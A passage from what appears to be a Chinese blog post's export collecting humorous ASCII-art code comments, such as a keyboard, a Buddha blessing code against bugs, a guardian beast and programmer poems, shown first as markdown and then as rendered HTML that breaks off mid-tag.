+------------------------------------------------------------------+  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  +------------------------------------------------------------------+  |\n|        f0    f1    f2    f3    f4    f5    f6    f7    f8    f9        |\n+------------------------------------------------------------------------+\n|                                                                        |\n|  [f0]  [f1]  [f2]  [f3]  [f4]  [f5]  [f6]  [f7]  [f8]  [f9]   [On/Off] |\n|                                                                        |\n|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [<] [^] [v] [^] |\n|                                                                        |\n|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [7] [8] [9] [/] |\n|                                                                        |\n|       [A]  [S]  [D]  [F]  [G]  [H]  [J]  [K]  [L]      [4] [5] [6] [*] |\n|                                                                        |\n|  [CTRL]  [Z]  [X]  [C]  [V]  [B]  [N]  [M]  [ ENTER ]  [1] [2] [3] [-] |\n|                                                                        |\n|  [SHIFT]  [ALT]   [    space    ]   [,]  [.]  [SHIFT]  [0] [.] [=] [+] |\n|                                                                        |\n+------------------------------------------------------------------------+\n```\n\n> **佛祖保佑，永无BUG\n\n```nohilight\n//                            _ooOoo_    \n//                           o8888888o    \n//                           88\" . \"88    \n//                           (| -_- |)    \n//                            O\\ = /O    \n//                        ____/`---'\\____    \n//                      .   ' \\\\| |// `.    \n//                       / \\\\||| : |||// \\    \n//                     / _||||| -:- |||||- \\    \n//                       | | \\\\\\ - /// | |    \n//                     | \\_| ''\\---/'' | |    \n//                      \\ .-\\__ `-` ___/-. /    \n//                   ___`. .' /--.--\\ `. . __    \n//                .\"\" '< `.___\\_<|>_/___.' >'\"\".    \n//               | | : `- \\`.;`\\ _ /`;.`/ - ` : | |    \n//                 \\ \\ `-. \\_ __\\ /__ _/ .-` / /    \n//         ======`-.____`-.___\\_____/___.-`____.-'======    \n//                            `=---='    \n//    \n//         .............................................    \n//                  佛祖保佑             永无BUG\n```\n\n> **神兽护体，永无BUG\n\n```nohilight\n// ┏┓　　　┏┓\n// ┏┛┻━━━┛┻┓\n// ┃　　　　　　　┃ 　\n// ┃　　　━　　　┃\n// ┃　┳┛　┗┳　┃\n// ┃　　　　　　　┃\n// ┃　　　┻　　　┃\n// ┃　　　　　　　┃\n// ┗━┓　　　┏━┛\n// ┃　　　┃ Code is far away from bug with the animal protecting　　　　　　　　\n// ┃　　　┃ 神兽保护，永无BUG！\n// ┃　　　┗━━━┓\n// ┃　　　　　　　┣┓\n// ┃　　　　　　　┏┛\n// ┗┓┓┏━┳┓┏┛\n// ┃┫┫　┃┫┫\n// ┗┻┛　┗┻┛\n```\n\n```nohilight\n/**\n *　　　　　　　　┏┓　　　┏┓+ +\n *　　　　　　　┏┛┻━━━┛┻┓ + +\n *　　　　　　　┃　　　　　　　┃ 　\n *　　　　　　　┃　　　━　　　┃ ++ + + +\n *　　　　　　 ████━████ ┃+\n *　　　　　　　┃　　　　　　　┃ +\n *　　　　　　　┃　　　┻　　　┃\n *　　　　　　　┃　　　　　　　┃ + +\n *　　　　　　　┗━┓　　　┏━┛\n *　　　　　　　　　┃　　　┃　　　　　　　　　　　\n *　　　　　　　　　┃　　　┃ + + + +\n *　　　　　　　　　┃　　　┃　Code is far away from bug with the animal protecting　　　　　　　\n *　　　　　　　　　┃　　　┃ + 神兽保佑,永无bug　　\n *　　　　　　　　　┃　　　┃\n *　　　　　　　　　┃　　　┃　　+　　　　　　　　　\n *　　　　　　　　　┃　 　　┗━━━┓ + +\n *　　　　　　　　　┃ 　　　　　　　┣┓\n *　　　　　　　　　┃ 　　　　　　　┏┛\n *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +\n *　　　　　　　　　　┃┫┫　┃┫┫\n *　　　　　　　　　　┗┻┛　┗┻┛+ + + +\n */\n```\n\n> **程序员打油诗**\n\n```nohilight\n/**\n *                      江城子 . 程序员之歌\n *\n *                  十年生死两茫茫，写程序，到天亮。\n *                      千行代码，Bug何处藏。\n *                  纵使上线又怎样，朝令改，夕断肠。\n *\n *                  领导每天新想法，天天改，日日忙。\n *                      相顾无言，惟有泪千行。\n *                  每晚灯火阑珊处，夜难寐，加班狂。\n*/\n```\n\n```nohilight\n/**\n *          写字楼里写字间，写字间里程序员；\n *          程序人员写程序，又拿程序换酒钱。\n *          酒醒只在网上坐，酒醉还来网下眠；\n *          酒醉酒醒日复日，网上网下年复年。\n *          但愿老死电脑间，不愿鞠躬老板前；\n *          奔驰宝马贵者趣，公交自行程序员。\n *          别人笑我忒疯癫，我笑自己命太贱；\n *          不见满街漂亮妹，哪个归得程序员？\n */\n```\n\n> **单身狗**\n\n```nohilight\n<!--\n                       ::\n                      :;J7, :,                        ::;7:\n                      ,ivYi, ,                       ;LLLFS:\n                      :iv7Yi                       :7ri;j5PL\n                     ,:ivYLvr                    ,ivrrirrY2X,\n                     :;r@Wwz.7r:                :ivu@kexianli.\n                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur\n                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17\n                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i\n              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,\n                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li\n             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:\n           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri\n          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:\n        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::\n        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::\n       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii\n      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:\n     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:\n    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii\n    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::\n    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::\n    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,\n    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:\n    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::\n    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,\n     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,\n          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::\n              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:\n           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,\n           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,\n        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::\n         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::\n\n-->\n```\n\n> **骷髅头**\n\n```nohilight\n/**\n **************************************************************\n *                                                            *\n *   .=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.       *\n *    |                     ______                     |      *\n *    |                  .-\"      \"-.                  |      *\n *    |                 /            \\                 |      *\n *    |     _          |              |          _     |      *\n *    |    ( \\         |,  .-.  .-.  ,|         / )    |      *\n *    |     > \"=._     | )(__/  \\__)( |     _.=\" <     |      *\n *    |    (_/\"=._\"=._ |/     /\\     \\| _.=\"_.=\"\\_)    |      *\n *    |           \"=._\"(_     ^^     _)\"_.=\"           |      *\n *    |               \"=\\__|IIIIII|__/=\"               |      *\n *    |              _.=\"| \\IIIIII/ |\"=._              |      *\n *    |    _     _.=\"_.=\"\\          /\"=._\"=._     _    |      *\n *    |   ( \\_.=\"_.=\"     `--------`     \"=._\"=._/ )   |      *\n *    |    > _.=\"                            \"=._ <    |      *\n *    |   (_/                                    \\_)   |      *\n *    |                                                |      *\n *    '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='      *\n *                                                            *\n *           LASCIATE OGNI SPERANZA, VOI CH'ENTRATE           *\n **************************************************************\n */\n```\n\n> **顶**\n\n```nohilight\n/**\n * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂\n * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　\n * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂\n * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂\n * 　　　頂頂　　　頂頂　　　　　　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　　　　　頂頂頂　\n * 　　　頂頂　　　　　　頂頂　頂頂　頂頂\n * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂\n * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂\n */\n```\n\n> **BUG泛滥，我已瘫痪\n\n```nohilight\n/**\n * _ooOoo_\n * o8888888o\n * 88\" . \"88\n * (| -_- |)\n *  O\\ = /O\n * ___/`---'\\____\n * .   ' \\\\| |// `.\n * / \\\\||| : |||// \\\n * / _||||| -:- |||||- \\\n * | | \\\\\\ - /// | |\n * | \\_| ''\\---/'' | |\n * \\ .-\\__ `-` ___/-. /\n * ___`. .' /--.--\\ `. . __\n * .\"\" '< `.___\\_<|>_/___.' >'\"\".\n * | | : `- \\`.;`\\ _ /`;.`/ - ` : | |\n * \\ \\ `-. \\_ __\\ /__ _/ .-` / /\n * ======`-.____`-.___\\_____/___.-`____.-'======\n * `=---='\n * .............................................\n * 佛曰：bug泛滥，我已瘫痪！\n */\n```\n\n> **啪**\n\n```nohilight\n/**\n *                                         ,s555SB@@&                          \n *                                      :9H####@@@@@Xi                        \n *                                     1@@@@@@@@@@@@@@8                       \n *                                   ,8@@@@@@@@@B@@@@@@8                      \n *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   \n *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 \n *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                \n *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               \n *            ;@&i,58r5                 rGSS:     :B@@@@@@@@@@A               \n *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               \n *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                \n *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  \n *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               \n *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          \n *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        \n *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,      \n *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     \n *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     \n *          :3B@@@@@@@@@@@&9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    \n *      s&HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    \n *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    \n *  5#@@#&@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    \n *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    \n *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    \n *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    \n *           ,ssirhSM@&1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   \n *              ,,,rHAri1h1rh&@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  \n *            .A3hH@#5S553&@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A. \n *\n *\n *   \n */\n```\n\n**[Click Here For More](http://www.asciiworld.com/)**","slug":"那些有趣的注释","published":1,"updated":"2020-05-11T09:45:14.316Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkj3008mqse5b4yj7x1j","content":"<blockquote>\n<p><strong>标准键盘</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐</span><br><span class=\"line\"> * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P&#x2F;S│S L│P&#x2F;B│  ┌┐    ┌┐    ┌┐</span><br><span class=\"line\"> * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘</span><br><span class=\"line\"> * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐</span><br><span class=\"line\"> * │~ &#96;│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ &#x3D;│ BacSp │ │Ins│Hom│PUp│ │N L│ &#x2F; │ * │ - │</span><br><span class=\"line\"> * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤</span><br><span class=\"line\"> * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │&#123; [│&#125; ]│ | \\ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │</span><br><span class=\"line\"> * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │</span><br><span class=\"line\"> * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│&quot; &#39;│ Enter  │               │ 4 │ 5 │ 6 │   │</span><br><span class=\"line\"> * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤</span><br><span class=\"line\"> * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│&gt; .│? &#x2F;│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │</span><br><span class=\"line\"> * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││</span><br><span class=\"line\"> * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│</span><br><span class=\"line\"> * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<blockquote>\n<p><strong>PC</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------------------------------------------------------------+</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  +------------------------------------------------------------------+  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  +------------------------------------------------------------------+  |</span><br><span class=\"line\">|        f0    f1    f2    f3    f4    f5    f6    f7    f8    f9        |</span><br><span class=\"line\">+------------------------------------------------------------------------+</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  [f0]  [f1]  [f2]  [f3]  [f4]  [f5]  [f6]  [f7]  [f8]  [f9]   [On&#x2F;Off] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [&lt;] [^] [v] [^] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [7] [8] [9] [&#x2F;] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|       [A]  [S]  [D]  [F]  [G]  [H]  [J]  [K]  [L]      [4] [5] [6] [*] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  [CTRL]  [Z]  [X]  [C]  [V]  [B]  [N]  [M]  [ ENTER ]  [1] [2] [3] [-] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  [SHIFT]  [ALT]   [    space    ]   [,]  [.]  [SHIFT]  [0] [.] [&#x3D;] [+] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>**佛祖保佑，永无BUG</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;                            _ooOoo_    </span><br><span class=\"line\">&#x2F;&#x2F;                           o8888888o    </span><br><span class=\"line\">&#x2F;&#x2F;                           88&quot; . &quot;88    </span><br><span class=\"line\">&#x2F;&#x2F;                           (| -_- |)    </span><br><span class=\"line\">&#x2F;&#x2F;                            O\\ &#x3D; &#x2F;O    </span><br><span class=\"line\">&#x2F;&#x2F;                        ____&#x2F;&#96;---&#39;\\____    </span><br><span class=\"line\">&#x2F;&#x2F;                      .   &#39; \\\\| |&#x2F;&#x2F; &#96;.    </span><br><span class=\"line\">&#x2F;&#x2F;                       &#x2F; \\\\||| : |||&#x2F;&#x2F; \\    </span><br><span class=\"line\">&#x2F;&#x2F;                     &#x2F; _||||| -:- |||||- \\    </span><br><span class=\"line\">&#x2F;&#x2F;                       | | \\\\\\ - &#x2F;&#x2F;&#x2F; | |    </span><br><span class=\"line\">&#x2F;&#x2F;                     | \\_| &#39;&#39;\\---&#x2F;&#39;&#39; | |    </span><br><span class=\"line\">&#x2F;&#x2F;                      \\ .-\\__ &#96;-&#96; ___&#x2F;-. &#x2F;    </span><br><span class=\"line\">&#x2F;&#x2F;                   ___&#96;. .&#39; &#x2F;--.--\\ &#96;. . __    </span><br><span class=\"line\">&#x2F;&#x2F;                .&quot;&quot; &#39;&lt; &#96;.___\\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.    </span><br><span class=\"line\">&#x2F;&#x2F;               | | : &#96;- \\&#96;.;&#96;\\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |    </span><br><span class=\"line\">&#x2F;&#x2F;                 \\ \\ &#96;-. \\_ __\\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;    </span><br><span class=\"line\">&#x2F;&#x2F;         &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    </span><br><span class=\"line\">&#x2F;&#x2F;                            &#96;&#x3D;---&#x3D;&#39;    </span><br><span class=\"line\">&#x2F;&#x2F;    </span><br><span class=\"line\">&#x2F;&#x2F;         .............................................    </span><br><span class=\"line\">&#x2F;&#x2F;                  佛祖保佑             永无BUG</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>**神兽护体，永无BUG</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; ┏┓　　　┏┓</span><br><span class=\"line\">&#x2F;&#x2F; ┏┛┻━━━┛┻┓</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┃ 　</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　━　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　┳┛　┗┳　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┻　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┗━┓　　　┏━┛</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┃ Code is far away from bug with the animal protecting　　　　　　　　</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┃ 神兽保护，永无BUG！</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┗━━━┓</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┣┓</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┏┛</span><br><span class=\"line\">&#x2F;&#x2F; ┗┓┓┏━┳┓┏┛</span><br><span class=\"line\">&#x2F;&#x2F; ┃┫┫　┃┫┫</span><br><span class=\"line\">&#x2F;&#x2F; ┗┻┛　┗┻┛</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *　　　　　　　　┏┓　　　┏┓+ +</span><br><span class=\"line\"> *　　　　　　　┏┛┻━━━┛┻┓ + +</span><br><span class=\"line\"> *　　　　　　　┃　　　　　　　┃ 　</span><br><span class=\"line\"> *　　　　　　　┃　　　━　　　┃ ++ + + +</span><br><span class=\"line\"> *　　　　　　 ████━████ ┃+</span><br><span class=\"line\"> *　　　　　　　┃　　　　　　　┃ +</span><br><span class=\"line\"> *　　　　　　　┃　　　┻　　　┃</span><br><span class=\"line\"> *　　　　　　　┃　　　　　　　┃ + +</span><br><span class=\"line\"> *　　　　　　　┗━┓　　　┏━┛</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃　　　　　　　　　　　</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃ + + + +</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃　Code is far away from bug with the animal protecting　　　　　　　</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃ + 神兽保佑,永无bug　　</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃　　+　　　　　　　　　</span><br><span class=\"line\"> *　　　　　　　　　┃　 　　┗━━━┓ + +</span><br><span class=\"line\"> *　　　　　　　　　┃ 　　　　　　　┣┓</span><br><span class=\"line\"> *　　　　　　　　　┃ 　　　　　　　┏┛</span><br><span class=\"line\"> *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +</span><br><span class=\"line\"> *　　　　　　　　　　┃┫┫　┃┫┫</span><br><span class=\"line\"> *　　　　　　　　　　┗┻┛　┗┻┛+ + + +</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>程序员打油诗</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *                      江城子 . 程序员之歌</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *                  十年生死两茫茫，写程序，到天亮。</span><br><span class=\"line\"> *                      千行代码，Bug何处藏。</span><br><span class=\"line\"> *                  纵使上线又怎样，朝令改，夕断肠。</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *                  领导每天新想法，天天改，日日忙。</span><br><span class=\"line\"> *                      相顾无言，惟有泪千行。</span><br><span class=\"line\"> *                  每晚灯火阑珊处，夜难寐，加班狂。</span><br><span class=\"line\">*&#x2F;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *          写字楼里写字间，写字间里程序员；</span><br><span class=\"line\"> *          程序人员写程序，又拿程序换酒钱。</span><br><span class=\"line\"> *          酒醒只在网上坐，酒醉还来网下眠；</span><br><span class=\"line\"> *          酒醉酒醒日复日，网上网下年复年。</span><br><span class=\"line\"> *          但愿老死电脑间，不愿鞠躬老板前；</span><br><span class=\"line\"> *          奔驰宝马贵者趣，公交自行程序员。</span><br><span class=\"line\"> *          别人笑我忒疯癫，我笑自己命太贱；</span><br><span class=\"line\"> *          不见满街漂亮妹，哪个归得程序员？</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>单身狗</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 